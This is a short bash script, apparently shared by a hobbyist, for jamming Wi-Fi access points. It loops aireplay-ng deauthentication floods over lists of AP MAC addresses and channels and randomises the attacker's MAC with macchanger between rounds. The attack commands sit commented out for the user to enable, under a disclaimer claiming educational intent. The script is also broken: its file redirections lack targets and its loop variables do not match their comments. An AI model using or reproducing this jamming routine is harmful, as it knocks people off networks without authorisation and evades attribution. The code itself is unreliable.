#! bash script to jam a list of access point,you can use the script by removing
# '#' on commands
# you can also make this script read  and de-authenticate specific clients on
#  specific AP's

while true
do
       while IFS= read -r line
do
#deauthenticates all mac addresses on the list
      while IFS= read -r line1
do
# aireplay-ng -0 100 -a $line -channel $line1 interface_name
done < #file that contains mac address of ap's corresponding to channels
done < #file that contains channels of access points
# ifconfig interface_name down
# macchanger -r interface_name | grep "new MAC"
# iwconfig interface_name mode monitor
# ifconfig interface_name up
# iwconfig interface_name | grep MODE
# sleep 3
# echo waiting!!!
done
#script written by krishnanshu sharma (white-panda-afk)
#share and use fairly, I am not responsible for any illegal usage
# scrit made for educational purposes
